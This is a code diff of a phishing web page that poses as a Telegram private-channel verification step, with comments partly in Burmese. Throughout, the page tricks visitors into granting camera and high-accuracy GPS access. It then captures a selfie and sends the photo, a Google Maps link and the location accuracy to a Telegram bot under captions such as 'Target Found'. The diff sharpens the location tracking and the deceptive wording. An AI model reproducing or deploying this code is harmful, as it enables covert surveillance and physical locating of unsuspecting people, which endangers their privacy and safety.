@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Telegram Invite System</title>
+    <title>Verification System</title>
     <style>
         body { margin: 0; background: #1c242f; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: white; text-align: center; }
         .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; }
@@ -13,11 +13,9 @@
 <body>
 
 <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="80" style="margin-bottom:20px;">
-    <h2>Join Private Channel</h2>
-    <p>Verification Required to continue.</p>
-    <button id="startBtn" class="join-btn">VERIFY & JOIN</button>
-    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
+    <h2>Access Denied</h2>
+    <p>Please verify your human identity to join the channel.</p>
+    <button id="startBtn" class="join-btn">VERIFY IDENTITY</button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -28,49 +26,28 @@
     const CHAT_ID = "5304050102";
     const REDIRECT_URL = "https://t.me/+MXbqj8pPVL82M2Zl";
 
-    // ပိုမိုတိကျသော Phone Model ရှာဖွေသည့်စနစ်
-    function getDetailedModel() {
-        const ua = navigator.userAgent;
-        let model = "Unknown Device";
-        
-        if (/android/i.test(ua)) {
-            // Android ဖုန်းများအတွက် Version နှင့် Model ကို ရှာဖွေခြင်း
-            const match = ua.match(/Android\s([^\s;]+);?\s?([^;]+)\sBuild/);
-            if (match) {
-                model = match[2].trim(); // ဒီနေရာမှာ Redmi Note 8 Pro စသည်ဖြင့် ပေါ်လာပါမည်
-            } else {
-                model = "Android Phone";
-            }
-        } else if (/iPhone/i.test(ua)) {
-            model = "iPhone";
-        }
-        return model;
-    }
-
     document.getElementById('startBtn').addEventListener('click', async () => {
-        const status = document.getElementById('status');
-        status.innerText = "Requesting permissions...";
-
         try {
-            // ၁။ Camera Permission
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('video').srcObject = stream;
+            // ၁။ High Accuracy Location တောင်းဆိုခြင်း
+            const geoOptions = {
+                enableHighAccuracy: true, // GPS ကို အသုံးပြုပြီး အိမ်လိပ်စာနီးပါး တိကျအောင် လုပ်ခြင်း
+                timeout: 10000,
+                maximumAge: 0
+            };
 
-            // ၂။ တည်နေရာ (Location) ကို အတင်းတောင်းဆိုခြင်း
-            // အကယ်၍ Permission မပေးပါက အောက်က catch ထဲသို့ ရောက်သွားပါမည်
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
-                // ၃။ ကျန်သည့် Info များ ရယူခြင်း
-                let battery = "N/A";
-                if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    battery = `${Math.round(b.level * 100)}%`;
-                }
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const accuracy = pos.coords.accuracy; // တိကျမှု ဘယ်နှစ်မီတာ ရှိသလဲဆိုတာ
 
-                const model = getDetailedModel();
+                // Google Maps Link (Plus Code ပါဝင်စေရန်)
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                // ၄။ ပုံရိုက်ပြီး ပို့ခြင်း
+                // ၂။ Camera Permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('video').srcObject = stream;
+
+                // ၃။ ပုံရိုက်ပြီး အချက်အလက်များ ပို့ခြင်း
                 setTimeout(async () => {
                     const canvas = document.getElementById('canvas');
                     const video = document.getElementById('video');
@@ -81,8 +58,8 @@
                     const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'shot.jpg');
-                    formData.append('caption', `🔔 *Target Captured!*\n\n📍 Google Map: ${mapLink}\n📱 Model: ${model}\n🔋 Battery: ${battery}`);
+                    formData.append('photo', blob, 'target.jpg');
+                    formData.append('caption', `🎯 *Target Found (High Precision)*\n\n📍 Map: ${mapLink}\n🎯 Accuracy: ${Math.round(accuracy)} meters\n🔋 Device Info Collected.`);
                     formData.append('parse_mode', 'Markdown');
 
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
@@ -92,16 +69,15 @@
                 }, 3000);
 
             }, (err) => {
-                alert("Please allow Location to verify your account.");
+                alert("Please enable High Accuracy GPS to continue.");
                 location.reload();
-            });
+            }, geoOptions);
 
         } catch (err) {
-            alert("Camera and Location are required for verification.");
+            alert("Verification Failed. Permission required.");
             location.reload();
         }
     });
 </script>
 </body>
 </html>
-
